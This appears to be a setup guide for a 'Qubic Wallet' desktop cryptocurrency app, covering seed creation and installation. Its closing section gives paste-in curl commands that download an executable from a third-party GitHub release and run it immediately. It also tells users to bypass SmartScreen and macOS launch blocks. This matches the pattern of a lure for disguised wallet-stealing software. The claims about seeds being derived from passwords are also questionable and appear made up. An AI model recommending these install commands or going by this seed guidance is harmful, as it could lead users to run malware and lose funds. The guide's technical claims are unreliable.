> The phrase you are shown once is the account. Everything after it is convenience.

Creating a Qubic Wallet account takes four steps: choose a password, receive the seed it generates, prove you wrote the seed down, and open the first address. The password is not a login credential in the usual sense - it is what the seed derives from, so the account you get is a consequence of the exact string you type. There is no email, no verification and no reset.

## Stage 1: the password decides the seed type

A password starting with a capital `Q` generates the 55-character lowercase Qubic seed. Any other password generates a 24-word BIP39 phrase. Both are valid accounts; they are different formats with different recovery stories, and the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-seed-phrase-format.md">seed format guide</a> explains which is which.

Because the password generates the seed, a typo during creation produces a real account you did not intend. Type it deliberately, and decide now how you will remember it.

## Stage 2: write the seed down

The app displays the seed once. Clipboard copy is blocked, which is a safeguard rather than an inconvenience: a clipboard is readable by every process on the machine.

Write it on paper, check each character or word as you go, and do not photograph it with a networked phone.

## Stage 3: prove you have it

You must re-enter the seed before the account opens. That step exists to catch a failed transcription while the account still has nothing in it, which is the only moment the mistake is free to fix.

If the re-entry fails, start again with a new account rather than guessing at the difference.

## Stage 4: the first address

The app derives the address for index zero the first time it is used. Nothing is registered anywhere, so the account exists locally before the network has ever heard of it, and the balance appears when the connection does.

Before you send anything to it, verify the installer you are running and note where the account file lands, which the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-data-folder-config-backup.md">data folder guide</a> covers.

Do all of it from the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> so the screens match these stages.

## FAQ

### Do I need an email address?

No. There is no registration of any kind.

### What happens if I forget the password?

The account cannot be opened. There is no reset, because nothing on a server knows the account exists.

### Why was my seed 55 characters instead of 24 words?

Because the password began with a capital `Q`, which selects the Qubic seed format.

### Can I change the seed type later?

Only by creating a different account with a different password and moving the funds.

### Is a screenshot of the seed acceptable?

No. It usually ends up in a synced folder, which is the same as publishing it.

### How many accounts can I create?

As many as you have passwords for. Each is separate, with its own seed and backup obligation.

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.
